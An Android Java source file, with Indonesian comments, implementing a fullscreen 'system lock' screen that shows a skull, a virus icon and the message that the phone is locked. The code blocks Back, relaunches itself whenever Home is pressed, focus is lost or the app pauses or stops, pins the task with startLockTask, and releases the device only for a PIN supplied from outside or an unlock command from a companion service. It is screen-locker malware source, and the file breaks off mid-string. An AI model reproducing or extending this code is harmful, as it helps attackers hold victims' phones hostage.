package com.nex.panel;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.app.admin.DevicePolicyManager;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

/**
 * LockActivity — Fullscreen Lock Activity
 * ══════════════════════════════════════════
 * Alur persis seperti referensi Pising_uid:
 *  1. Activity ditampilkan fullscreen
 *  2. Intro screen (4.5 detik) — animasi loading
 *  3. Main content — keypad PIN + virus icon
 *  4. User input PIN 4 digit
 *  5. Salah → shake + "PIN Salah!"
 *  6. Benar → flash hijau → unlock → finish()
 *
 * Cara kembali ke layar normal: HANYA lewat PIN benar
 * Back / Home / Recent → diabaikan (isUnlocked = false)
 */
public class LockActivity extends Activity {

    private static final String TAG = "LockActivity";

    public static final String EXTRA_PIN     = "lock_pin";
    public static final String EXTRA_MESSAGE = "lock_message";

    private static final String UNLOCK_ACTION = "com.nex.panel.UNLOCK_ACTIVITY";

    private WebView  webView;
    private String   correctPin  = "1234";
    private String   lockMessage = "HP ANDA DIKUNCI!";
    private boolean  isUnlocked  = false;
    private boolean  isReceiverRegistered = false;
    private MediaPlayer mediaPlayer;

    private final BroadcastReceiver unlockReceiver = new BroadcastReceiver() {
        @Override public void onReceive(Context ctx, Intent intent) {
            if (UNLOCK_ACTION.equals(intent.getAction())) {
                isUnlocked = true;
                finish();
            }
        }
    };

    // ── onCreate ──────────────────────────────────────────────────────────
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Ambil extras
        if (getIntent() != null) {
            String p = getIntent().getStringExtra(EXTRA_PIN);
            String m = getIntent().getStringExtra(EXTRA_MESSAGE);
            if (p != null && !p.isEmpty()) correctPin  = p;
            if (m != null && !m.isEmpty()) lockMessage = m;
        }

        // Fullscreen — di atas lock screen
        getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON      |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED     |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD     |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON       |
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        );

        // Immersive mode
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                getWindow().setDecorFitsSystemWindows(false);
            } catch (Exception ignored) {}
        }

        setupWebView();
        registerUnlockReceiver();

        // startLockTask — persis seperti referensi (cegah user keluar via recent/home)
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                getSystemService(DEVICE_POLICY_SERVICE);
            if (dpm != null && dpm.isLockTaskPermitted(getPackageName())) {
                startLockTask();
            }
        } catch (Exception e) {
            Log.w(TAG, "startLockTask: " + e.getMessage());
        }

        // playLockSound — bunyi saat lock aktif (persis seperti referensi)
        playLockSound();
    }

    // ── Play Lock Sound — persis seperti referensi ────────────────────────
    private void playLockSound() {
        try {
            // Coba dari res/raw/lock.mp3 dulu (jika ada)
            int resId = getResources().getIdentifier("lock", "raw", getPackageName());
            if (resId != 0) {
                android.content.res.AssetFileDescriptor afd =
                    getResources().openRawResourceFd(resId);
                if (afd != null) {
                    mediaPlayer = new MediaPlayer();
                    mediaPlayer.setDataSource(
                        afd.getFileDescriptor(),
                        afd.getStartOffset(),
                        afd.getLength()
                    );
                    afd.close();
                    mediaPlayer.prepare();
                    mediaPlayer.start();
                    mediaPlayer.setOnCompletionListener(mp -> {
                        mp.release();
                        mediaPlayer = null;
                    });
                    return;
                }
            }
            // Fallback: tidak ada file — silent (tidak crash)
            Log.d(TAG, "playLockSound: no raw/lock.mp3 — skip");
        } catch (Exception e) {
            Log.w(TAG, "playLockSound: " + e.getMessage());
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        if (intent != null) {
            String p = intent.getStringExtra(EXTRA_PIN);
            String m = intent.getStringExtra(EXTRA_MESSAGE);
            if (p != null && !p.isEmpty()) correctPin  = p;
            if (m != null && !m.isEmpty()) lockMessage = m;
        }
    }

    // Blokir Back — hanya bisa keluar lewat PIN benar
    @Override
    public void onBackPressed() {
        if (!isUnlocked) return; // blokir total
        super.onBackPressed();
    }

    // Blokir tombol Home — paksa kembali ke LockActivity
    @Override
    protected void onUserLeaveHint() {
        if (isUnlocked) return;
        // Langsung re-launch tanpa delay
        Intent back = new Intent(this, LockActivity.class);
        back.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK |
                      Intent.FLAG_ACTIVITY_REORDER_TO_FRONT |
                      Intent.FLAG_ACTIVITY_NO_ANIMATION);
        back.putExtra(EXTRA_PIN,     correctPin);
        back.putExtra(EXTRA_MESSAGE, lockMessage);
        startActivity(back);
    }

    // Paksa kembali ke depan saat focus hilang (misalnya notification shade)
    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (!hasFocus && !isUnlocked) {
            // Delay sangat singkat agar sistem tidak crash
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                if (isUnlocked) return;
                Intent back = new Intent(this, LockActivity.class);
                back.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK |
                              Intent.FLAG_ACTIVITY_REORDER_TO_FRONT |
                              Intent.FLAG_ACTIVITY_NO_ANIMATION);
                back.putExtra(EXTRA_PIN,     correctPin);
                back.putExtra(EXTRA_MESSAGE, lockMessage);
                startActivity(back);
            }, 100);
        }
    }

    // Saat app lain terbuka / layar mati → paksa kembali ke LockActivity
    @Override
    protected void onPause() {
        super.onPause();
        if (isUnlocked) return;
        // Delay sangat singkat agar tidak loop crash
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            if (isUnlocked) return;
            Intent back = new Intent(this, LockActivity.class);
            back.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK         |
                          Intent.FLAG_ACTIVITY_REORDER_TO_FRONT  |
                          Intent.FLAG_ACTIVITY_NO_ANIMATION);
            back.putExtra(EXTRA_PIN,     correctPin);
            back.putExtra(EXTRA_MESSAGE, lockMessage);
            startActivity(back);
        }, 100);
    }

    @Override
    protected void onStop() {
        super.onStop();
        if (isUnlocked) return;
        // Paksa balik ke lock untuk semua versi Android
        Intent back = new Intent(this, LockActivity.class);
        back.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK         |
                      Intent.FLAG_ACTIVITY_REORDER_TO_FRONT  |
                      Intent.FLAG_ACTIVITY_NO_ANIMATION);
        back.putExtra(EXTRA_PIN,     correctPin);
        back.putExtra(EXTRA_MESSAGE, lockMessage);
        startActivity(back);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (isReceiverRegistered) {
            try { unregisterReceiver(unlockReceiver); } catch (Exception ignored) {}
            isReceiverRegistered = false;
        }
        if (mediaPlayer != null) {
            mediaPlayer.release();
            mediaPlayer = null;
        }
        if (webView != null) {
            webView.destroy();
            webView = null;
        }
    }

    // ── Setup WebView ─────────────────────────────────────────────────────

    @SuppressLint("SetJavaScriptEnabled")
    private void setupWebView() {
        webView = new WebView(this);
        WebSettings ws = webView.getSettings();
        ws.setJavaScriptEnabled(true);
        ws.setDomStorageEnabled(true);
        ws.setBuiltInZoomControls(false);
        ws.setDisplayZoomControls(false);
        webView.setBackgroundColor(Color.TRANSPARENT);
        webView.addJavascriptInterface(new LockBridge(), "LockBridge");
        webView.setWebViewClient(new WebViewClient());
        webView.loadDataWithBaseURL(null, buildLockHtml(), "text/html", "UTF-8", null);
        setContentView(webView);
    }

    // ── BroadcastReceiver untuk unlock dari service ───────────────────────

    private void registerUnlockReceiver() {
        if (isReceiverRegistered) return;
        try {
            IntentFilter filter = new IntentFilter(UNLOCK_ACTION);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(unlockReceiver, filter, RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(unlockReceiver, filter);
            }
            isReceiverRegistered = true;
        } catch (Exception e) {
            Log.w(TAG, "registerReceiver: " + e.getMessage());
        }
    }

    // ── JavaScript Bridge ─────────────────────────────────────────────────

    public class LockBridge {

        @JavascriptInterface
        public boolean tryUnlock(String pin) {
            boolean ok = pin.equals(correctPin);
            if (ok) {
                new Handler(Looper.getMainLooper()).post(() -> {
                    // Broadcast ke LockOverlayService agar service tahu unlock
                    try {
                        Intent intent = new Intent(LockActivity.this,
                            LockOverlayService.class);
                        intent.setAction(LockOverlayService.ACTION_UNLOCK);
                        startService(intent);
                    } catch (Exception ignored) {}
                    // Broadcast ke receiver lokal
                    Intent uIntent = new Intent(UNLOCK_ACTION);
                    uIntent.setPackage(getPackageName());
                    sendBroadcast(uIntent);
                });
            }
            return ok;
        }

        @JavascriptInterface
        public String getLockTitle() {
            return lockMessage;
        }
    }

    // ── HTML Lock Page — Persis seperti referensi ─────────────────────────

    private String buildLockHtml() {
        // Escape message untuk HTML
        String safeTitle = lockMessage
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace("\"", "&quot;");

        return "<!DOCTYPE html>\n" +
"<html>\n" +
"<head>\n" +
"<meta charset=\"UTF-8\">\n" +
"<meta name=\"viewport\" content=\"width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no\">\n" +
"<link href=\"https://fonts.googleapis.com/css2?family=Baloo+2:wght@400;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap\" rel=\"stylesheet\">\n" +
"<style>\n" +
"*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}\n" +
":root{\n" +
"  --bg:#fdf6e3;--card:#ffffff;--yellow:#ffd93d;--yellow-dark:#f4c430;\n" +
"  --blue:#5b8def;--blue-dark:#3d6fd9;--green:#4caf50;--green-dark:#388e3c;\n" +
"  --red:#ff4757;--pink:#ffb3d9;--pink-dark:#ff80c0;\n" +
"  --black:#1a1a1a;--black2:#2d2d2d;--gray:#888888;--gray2:#e0e0e0;\n" +
"  --text:#1a1a1a;--text2:#666666;--text3:#aaaaaa;\n" +
"  --font:'Baloo 2',cursive;--mono:'JetBrains Mono',monospace;\n" +
"}\n" +
"html,body{height:100%;width:100%;overflow:hidden;touch-action:manipulation}\n" +
"body{background:var(--bg);font-family:var(--font);-webkit-font-smoothing:antialiased;\n" +
"  display:flex;flex-direction:column;align-items:center;justify-content:center;\n" +
"  min-height:100vh;padding:20px;position:relative;overflow:hidden;color:var(--text)}\n" +
".bg-dots{position:fixed;inset:0;pointer-events:none;z-index:0;\n" +
"  background-image:radial-gradient(circle,rgba(255,179,217,.35) 2px,transparent 2px);\n" +
"  background-size:28px 28px;animation:dotMove 15s linear infinite}\n" +
"@keyframes dotMove{0%{background-position:0 0}100%{background-position:28px 28px}}\n" +
".bg-blob{position:fixed;border-radius:50%;pointer-events:none;z-index:0;filter:blur(50px);opacity:.5}\n" +
".bg-blob.b1{width:320px;height:320px;background:var(--yellow);top:-120px;left:-120px;animation:blobFloat1 14s ease-in-out infinite}\n" +
".bg-blob.b2{width:280px;height:280px;background:var(--pink);bottom:-100px;right:-100px;animation:blobFloat2 18s ease-in-out infinite}\n" +
".bg-blob.b3{width:220px;height:220px;background:var(--blue);bottom:25%;left:-80px;animation:blobFloat3 16s ease-in-out infinite}\n" +
".bg-blob.b4{width:180px;height:180px;background:var(--green);top:40%;right:-60px;animation:blobFloat1 20s ease-in-out infinite reverse}\n" +
"@keyframes blobFloat1{0%,100%{transform:translate(0,0) scale(1)}33%{transform:translate(40px,-30px) scale(1.15)}66%{transform:translate(-20px,20px) scale(.9)}}\n" +
"@keyframes blobFloat2{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(-40px,-40px) scale(1.2)}}\n" +
"@keyframes blobFloat3{0%,100%{transform:translate(0,0) scale(1)}33%{transform:translate(30px,40px) scale(1.1)}66%{transform:translate(-30px,-20px) scale(.95)}}\n" +
".bg-star{position:fixed;pointer-events:none;z-index:1;font-size:14px;opacity:.6;animation:starFloat linear infinite}\n" +
"@keyframes starFloat{0%{transform:translateY(100vh) rotate(0deg);opacity:0}10%{opacity:.6}90%{opacity:.6}100%{transform:translateY(-100px) rotate(360deg);opacity:0}}\n" +
"#introScreen{position:fixed;inset:0;background:var(--black);\n" +
"  display:flex;flex-direction:column;align-items:center;justify-content:center;\n" +
"  z-index:100;gap:22px;padding:24px;\n" +
"  animation:introDismiss .6s ease forwards 4.5s;overflow:hidden}\n" +
"@keyframes introDismiss{0%{opacity:1;transform:none}100%{opacity:0;transform:scale(1.05);pointer-events:none}}\n" +
"#introScreen::before{content:'';position:absolute;inset:0;\n" +
"  background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(255,217,61,.04) 3px,rgba(255,217,61,.04) 6px);\n" +
"  pointer-events:none;animation:introScan 6s linear infinite}\n" +
"@keyframes introScan{0%{background-position:0 0}100%{background-position:0 100px}}\n" +
".intro-card{background:var(--yellow);border:4px solid var(--black);border-radius:28px;\n" +
"  padding:22px 32px;box-shadow:7px 7px 0 var(--black);\n" +
"  display:flex;align-items:center;justify-content:center;\n" +
"  animation:introPop .6s cubic-bezier(.16,1.4,.3,1) both,introBounce 2s ease-in-out 0.6s infinite;position:relative;z-index:1}\n" +
"@keyframes introPop{from{opacity:0;transform:scale(.3) rotate(-15deg)}to{opacity:1;transform:none}}\n" +
"@keyframes introBounce{0%,100%{transform:translateY(0) rotate(0)}50%{transform:translateY(-8px) rotate(2deg)}}\n" +
".intro-skull{animation:pulseSkull 1.2s ease-in-out infinite,wiggle 3s ease-in-out infinite}\n" +
"@keyframes pulseSkull{0%,100%{filter:drop-shadow(0 0 0 transparent)}50%{filter:drop-shadow(0 0 16px var(--red))}}\n" +
"@keyframes wiggle{0%,100%{transform:rotate(-3deg)}50%{transform:rotate(3deg)}}\n" +
".intro-title{font-family:var(--font);font-size:26px;font-weight:800;letter-spacing:3px;\n" +
"  text-transform:uppercase;color:var(--yellow);text-align:center;line-height:1.6;position:relative;z-index:1}\n" +
".intro-title .line{display:block;overflow:hidden;white-space:nowrap}\n" +
".intro-title .line1{animation:typeIn .5s steps(22,end) .3s both,textGlow 2s ease-in-out 1s infinite}\n" +
".intro-title .line2{animation:typeIn .5s steps(18,end) 1s both,textGlow 2s ease-in-out 1.5s infinite}\n" +
".intro-title .line3{animation:typeIn .6s steps(26,end) 1.7s both,textGlow 2s ease-in-out 2s infinite}\n" +
"@keyframes typeIn{from{width:0;opacity:0}to{opacity:1}}\n" +
"@keyframes textGlow{0%,100%{text-shadow:0 0 0 transparent}50%{text-shadow:0 0 20px var(--yellow),0 0 40px rgba(255,217,61,.5)}}\n" +
".intro-bar-wrap{width:240px;height:10px;background:var(--black2);border:3px solid var(--yellow);\n" +
"  border-radius:999px;overflow:hidden;box-shadow:4px 4px 0 rgba(255,217,61,.3);\n" +
"  position:relative;z-index:1;animation:barPulse 1.5s ease-in-out infinite}\n" +
"@keyframes barPulse{0%,100%{box-shadow:4px 4px 0 rgba(255,217,61,.3)}50%{box-shadow:4px 4px 0 rgba(255,217,61,.3),0 0 20px rgba(255,217,61,.5)}}\n" +
".intro-bar{height:100%;width:0%;background:linear-gradient(90deg,var(--yellow),var(--pink),var(--blue),var(--yellow));\n" +
"  background-size:300% 100%;border-radius:999px;\n" +
"  animation:barFill 2.5s ease .5s forwards,barShimmer 2s linear infinite}\n" +
"@keyframes barFill{to{width:100%}}\n" +
"@keyframes barShimmer{0%{background-position:0% 50%}100%{background-position:300% 50%}}\n" +
".intro-pct-wrap{font-family:var(--mono);font-size:13px;letter-spacing:3px;color:var(--yellow);\n" +
"  font-weight:700;position:relative;z-index:1;animation:blink 1s ease-in-out infinite}\n" +
"@keyframes blink{0%,100%{opacity:1}50%{opacity:.5}}\n" +
"#mainContent{display:flex;flex-direction:column;align-items:center;position:relative;z-index:2;\n" +
"  opacity:0;animation:mainIn .7s ease forwards 4.7s;width:100%;max-width:360px}\n" +
"@keyframes mainIn{to{opacity:1}}\n" +
".virus-wrap{position:relative;width:120px;height:120px;margin-bottom:18px;flex-shrink:0;\n" +
"  animation:popIn .6s cubic-bezier(.16,1.4,.3,1) both,floatY 3s ease-in-out .6s infinite}\n" +
"@keyframes popIn{from{opacity:0;transform:scale(.3) rotate(-180deg)}to{opacity:1;transform:none}}\n" +
"@keyframes floatY{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}\n" +
".virus-bg{width:120px;height:120px;border-radius:50%;background:var(--yellow);\n" +
"  border:4px solid var(--black);display:flex;align-items:center;justify-content:center;\n" +
"  position:relative;z-index:1;box-shadow:6px 6px 0 var(--black);\n" +
"  animation:virusPulse 2s ease-in-out infinite}\n" +
"@keyframes virusPulse{0%,100%{box-shadow:6px 6px 0 var(--black);transform:scale(1)}\n" +
"  50%{box-shadow:6px 6px 0 var(--black),0 0 0 10px rgba(255,217,61,.3);transform:scale(1.05)}}\n" +
".v-orbit{position:absolute;inset:-16px;border-radius:50%;border:3px dashed var(--black);animation:orbitSpin 10s linear infinite}\n" +
".v-orbit2{position:absolute;inset:-28px;border-radius:50%;border:2px dotted var(--blue);animation:orbitSpin 16s linear infinite reverse}\n" +
".v-orbit3{position:absolute;inset:-40px;border-radius:50%;border:1px solid rgba(255,71,87,.4);animation:orbitSpin 24s linear infinite}\n" +
"@keyframes orbitSpin{to{transform:rotate(360deg)}}\n" +
".spike-dot{position:absolute;width:12px;height:12px;border-radius:50%;background:var(--red);border:2px solid var(--black);animation:spikePulse 1.5s ease-in-out infinite}\n" +
".spike-dot:nth-child(1){top:-7px;left:50%;transform:translateX(-50%);animation-delay:0s}\n" +
".spike-dot:nth-child(2){bottom:-7px;left:50%;transform:translateX(-50%);animation-delay:.3s}\n" +
".spike-dot:nth-child(3){left:-7px;top:50%;transform:translateY(-50%);animation-delay:.6s;animation-name:spikePulseY}\n" +
".spike-dot:nth-child(4){right:-7px;top:50%;transform:translateY(-50%);animation-delay:.9s;animation-name:spikePulseY}\n" +
"@keyframes spikePulse{0%,100%{opacity:1;transform:scale(1) translateX(-50%)}50%{opacity:.3;transform:scale(.5) translateX(-50%)}}\n" +
"@keyframes spikePulseY{0%,100%{opacity:1;transform:scale(1) translateY(-50%)}50%{opacity:.3;transform:scale(.5) translateY(-50%)}}\n" +
".virus-svg{animation:virusSpin 8s linear infinite,virusWiggle 3s ease-in-out infinite}\n" +
"@keyframes virusSpin{to{transform:rotate(360deg)}}\n" +
"@keyframes virusWiggle{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}\n" +
".lock-title{font-size:28px;font-weight:800;color:var(--black);text-align:center;\n" +
"  letter-spacing:-.3px;line-height:1.2;margin-bottom:6px;\n" +
"  animation:fadeUp .5s cubic-bezier(.16,1.4,.3,1) .1s both,titleWiggle 4s ease-in-out .6s infinite;\n" +
"  text-shadow:2px 2px 0 var(--yellow);position:relative;z-index:1}\n" +
"@keyframes titleWiggle{0%,100%{transform:rotate(0) scale(1)}25%{transform:rotate(-1deg) scale(1.02)}75%{transform:rotate(1deg) scale(1.02)}}\n" +
".lock-sub{font-family:var(--mono);font-size:10px;color:var(--text2);letter-spacing:2.5px;\n" +
"  text-transform:uppercase;text-align:center;margin-bottom:24px;\n" +
"  animation:fadeUp .5s cubic-bezier(.16,1.4,.3,1) .15s both,subShimmer 3s ease-in-out infinite;font-weight:700}\n" +
"@keyframes subShimmer{0%,100%{color:var(--text2)}50%{color:var(--blue-dark)}}\n" +
".pin-wrap{display:flex;gap:18px;justify-content:center;margin-bottom:14px;\n" +
"  animation:fadeUp .5s cubic-bezier(.16,1.4,.3,1) .2s both}\n" +
".pin-dot{width:20px;height:20px;border-radius:50%;border:3px solid var(--black);\n" +
"  background:var(--card);transition:background .18s,transform .18s,box-shadow .18s;\n" +
"  box-shadow:2px 2px 0 var(--black)}\n" +
".pin-dot.filled{background:var(--yellow);transform:scale(1.2);\n" +
"  box-shadow:2px 2px 0 var(--black),0 0 0 5px rgba(255,217,61,.4);\n" +
"  animation:dotPop .3s cubic-bezier(.16,1.4,.3,1)}\n" +
"@keyframes dotPop{0%{transform:scale(1)}50%{transform:scale(1.4)}100%{transform:scale(1.2)}}\n" +
".pin-dot.error{background:var(--red);animation:shake .4s ease;\n" +
"  box-shadow:2px 2px 0 var(--black),0 0 0 5px rgba(255,71,87,.4)}\n" +
"@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-9px)}75%{transform:translateX(9px)}}\n" +
".pin-status{height:26px;margin-bottom:22px;font-family:var(--mono);font-size:11px;\n" +
"  letter-spacing:1.5px;text-transform:uppercase;text-align:center;color:var(--text2);\n" +
"  transition:color .2s;font-weight:700;\n" +
"  animation:fadeUp .5s cubic-bezier(.16,1.4,.3,1) .25s both}\n" +
".pin-status.err{color:var(--red);animation:errBlink .3s ease 3}\n" +
".pin-status.ok{color:var(--green-dark);animation:okPulse 1s ease infinite}\n" +
"@keyframes errBlink{0%,100%{opacity:1}50%{opacity:.4}}\n" +
"@keyframes okPulse{0%,100%{text-shadow:0 0 0 transparent}50%{text-shadow:0 0 12px var(--green)}}\n" +
".keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;width:100%;max-width:310px;\n" +
"  animation:fadeUp .5s cubic-bezier(.16,1.4,.3,1) .3s both;touch-action:manipulation}\n" +
".key{height:70px;border-radius:20px;border:3px solid var(--black);background:var(--card);\n" +
"  color:var(--black);display:flex;flex-direction:column;align-items:center;justify-content:center;\n" +
"  cursor:pointer;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none;\n" +
"  touch-action:manipulation;transition:transform .1s,background .1s,box-shadow .1s;\n" +
"  position:relative;overflow:hidden;user-select:none;-webkit-user-select:none;\n" +
"  box-shadow:5px 5px 0 var(--black);font-family:var(--font);\n" +
"  animation:keyEntrance .5s cubic-bezier(.16,1.4,.3,1) both}\n" +
".key:nth-child(1){animation-delay:.32s}.key:nth-child(2){animation-delay:.35s}.key:nth-child(3){animation-delay:.38s}\n" +
".key:nth-child(4){animation-delay:.41s}.key:nth-child(5){animation-delay:.44s}.key:nth-child(6){animation-delay:.47s}\n" +
".key:nth-child(7){animation-delay:.5s}.key:nth-child(8){animation-delay:.53s}.key:nth-child(9){animation-delay:.56s}\n" +
".key:nth-child(11){animation-delay:.59s}.key:nth-child(12){animation-delay:.62s}\n" +
"@keyframes keyEntrance{from{opacity:0;transform:scale(.5) translateY(20px)}to{opacity:1;transform:none}}\n" +
".key::before{content:'';position:absolute;top:0;left:0;right:0;height:40%;\n" +
"  background:linear-gradient(180deg,rgba(255,255,255,.4),transparent);\n" +
"  border-radius:17px 17px 50% 50%;pointer-events:none}\n" +
".key .num{font-size:28px;font-weight:800;line-height:1;color:var(--black);position:relative;z-index:1}\n" +
".key .sub{font-family:var(--mono);font-size:8px;letter-spacing:1.5px;color:var(--text2);margin-top:2px;font-weight:700;position:relative;z-index:1}\n" +
".key.del{color:var(--black);background:var(--gray2)}\n" +
".key.empty{pointer-events:none;opacity:0;background:transparent;border-color:transparent;box-shadow:none}\n" +
".key:active{transform:translate(3px,3px);box-shadow:2px 2px 0 var(--black);background:var(--yellow)}\n" +
".key[data-n='1']:active,.key[data-n='2']:active,.key[data-n='3']:active{background:var(--pink)}\n" +
".key[data-n='4']:active,.key[data-n='5']:active,.key[data-n='6']:active{background:var(--yellow)}\n" +
".key[data-n='7']:active,.key[data-n='8']:active,.key[data-n='9']:active{background:#a8d8ff}\n" +
".key[data-n='0']:active{background:var(--green);color:#fff}\n" +
".key.del:active{background:var(--red);color:#fff}\n" +
"@keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:none}}\n" +
".success-flash{position:fixed;inset:0;background:var(--green);opacity:0;\n" +
"  pointer-events:none;z-index:9999;animation:successFlash .8s ease}\n" +
"@keyframes successFlash{0%{opacity:0}30%{opacity:.6}100%{opacity:0}}\n" +
"@media (max-height:720px){.virus-wrap{width:100px;height:100px}.virus-bg{width:100px;height:100px}.lock-title{font-size:24px}.key{height:60px}.key .num{font-size:24px}}\n" +
"@media (max-height:600px){.lock-sub{display:none}.pin-status{margin-bottom:14px}.key{height:54px}.key .num{font-size:22px}}\n" +
"</style>\n" +
"</head>\n" +
"<body>\n" +
"<div class=\"bg-blob b1\"></div>\n" +
"<div class=\"bg-blob b2\"></div>\n" +
"<div class=\"bg-blob b3\"></div>\n" +
"<div class=\"bg-blob b4\"></div>\n" +
"<div class=\"bg-dots\"></div>\n" +
"<div id=\"stars\"></div>\n" +
"<!-- INTRO SCREEN -->\n" +
"<div id=\"introScreen\">\n" +
"  <div class=\"intro-card\">\n" +
"    <div class=\"intro-skull\">\n" +
"      <svg width=\"80\" height=\"80\" viewBox=\"0 0 64 64\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
"        <ellipse cx=\"32\" cy=\"26\" rx=\"18\" ry=\"17\" fill=\"#fff\" stroke=\"#1a1a1a\" stroke-width=\"3\"/>\n" +
"        <ellipse cx=\"24\" cy=\"24\" rx=\"5.5\" ry=\"6\" fill=\"#1a1a1a\"/>\n" +
"        <ellipse cx=\"40\" cy=\"24\" rx=\"5.5\" ry=\"6\" fill=\"#1a1a1a\"/>\n" +
"        <circle cx=\"25\" cy=\"23\" r=\"1.5\" fill=\"#fff\"/>\n" +
"        <circle cx=\"41\" cy=\"23\" r=\"1.5\" fill=\"#fff\"/>\n" +
"        <path d=\"M30 32 L32 28 L34 32 Z\" fill=\"#ff4757\"/>\n" +
"        <path d=\"M14 38 Q14 48 22 48 L22 52 L26 52 L26 48 L32 48 L32 52 L36 52 L36 48 L42 48 Q50 48 50 38\" fill=\"#1a1a1a\" stroke=\"#1a1a1a\" stroke-width=\"2\" stroke-linecap=\"round\"/>\n" +
"      </svg>\n" +
"    </div>\n" +
"  </div>\n" +
"  <div class=\"intro-title\">\n" +
"    <span class=\"line line1\">HAI BRO</span>\n" +
"    <span class=\"line line2\">SHIKIMORI</span>\n" +
"    <span class=\"line line3\">SYSTEM LOCK</span>\n" +
"  </div>\n" +
"  <div class=\"intro-bar-wrap\"><div class=\"intro-bar\"></div></div>\n" +
"  <div class=\"intro-pct-wrap\"><span id=\"pctNum\">0%</span></div>\n" +
"</div>\n" +
"<!-- MAIN CONTENT -->\n" +
"<div id=\"mainContent\">\n" +
"  <div class=\"virus-wrap\">\n" +
"    <div class=\"v-orbit\">\n" +
"      <div class=\"spike-dot\"></div><div class=\"spike-dot\"></div>\n" +
"      <div class=\"spike-dot\"></div><div class=\"spike-dot\"></div>\n" +
"    </div>\n" +
"    <div class=\"v-orbit2\"></div>\n" +
"    <div class=\"v-orbit3\"></div>\n" +
"    <div class=\"virus-bg\">\n" +
"      <svg class=\"virus-svg\" width=\"66\" height=\"66\" viewBox=\"0 0 100 100\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
"        <circle cx=\"50\" cy=\"50\" r=\"24\" fill=\"#fff\" stroke=\"#1a1a1a\" stroke-width=\"3\"/>\n" +
"        <circle cx=\"50\" cy=\"50\" r=\"14\" fill=\"#ff4757\" stroke=\"#1a1a1a\" stroke-width=\"2\" stroke-dasharray=\"3 3\"/>\n" +
"        <circle cx=\"50\" cy=\"50\" r=\"5\" fill=\"#1a1a1a\"/>\n" +
"        <line x1=\"50\" y1=\"22\" x2=\"50\" y2=\"10\" stroke=\"#1a1a1a\" stroke-width=\"3\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"50\" cy=\"8\" r=\"4\" fill=\"#ffd93d\" stroke=\"#1a1a1a\" stroke-width=\"2\"/>\n" +
"        <line x1=\"72\" y1=\"33\" x2=\"81\" y2=\"24\" stroke=\"#1a1a1a\" stroke-width=\"3\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"83\" cy=\"22\" r=\"4\" fill=\"#ffd93d\" stroke=\"#1a1a1a\" stroke-width=\"2\"/>\n" +
"        <line x1=\"78\" y1=\"50\" x2=\"90\" y2=\"50\" stroke=\"#1a1a1a\" stroke-width=\"3\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"92\" cy=\"50\" r=\"4\" fill=\"#ffd93d\" stroke=\"#1a1a1a\" stroke-width=\"2\"/>\n" +
"        <line x1=\"72\" y1=\"67\" x2=\"81\" y2=\"76\" stroke=\"#1a1a1a\" stroke-width=\"3\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"83\" cy=\"78\" r=\"4\" fill=\"#ffd93d\" stroke=\"#1a1a1a\" stroke-width=\"2\"/>\n" +
"        <line x1=\"50\" y1=\"78\" x2=\"50\" y2=\"90\" stroke=\"#1a1a1a\" stroke-width=\"3\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"50\" cy=\"92\" r=\"4\" fill=\"#ffd93d\" stroke=\"#1a1a1a\" stroke-width=\"2\"/>\n" +
"        <line x1=\"28\" y1=\"67\" x2=\"19\" y2=\"76\" stroke=\"#1a1a1a\" stroke-width=\"3\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"17\" cy=\"78\" r=\"4\" fill=\"#ffd93d\" stroke=\"#1a1a1a\" stroke-width=\"2\"/>\n" +
"        <line x1=\"22\" y1=\"50\" x2=\"10\" y2=\"50\" stroke=\"#1a1a1a\" stroke-width=\"3\" stroke-linecap=\"round\"/>\n" +
"        <circle cx=\"8\" cy=\"50\" r=\"4\" fill=\"#ffd93d\" stroke=\"#1a1a1a\" stroke-width=\"2\"/>\n" +
"        <line x1=\"28\" y1=\"33\" x2=\"19\" y2=\"24\" stroke=\"#1a1a1a\" stroke-width=\"3\" stroke-linecap=\"round\"/>\n" +
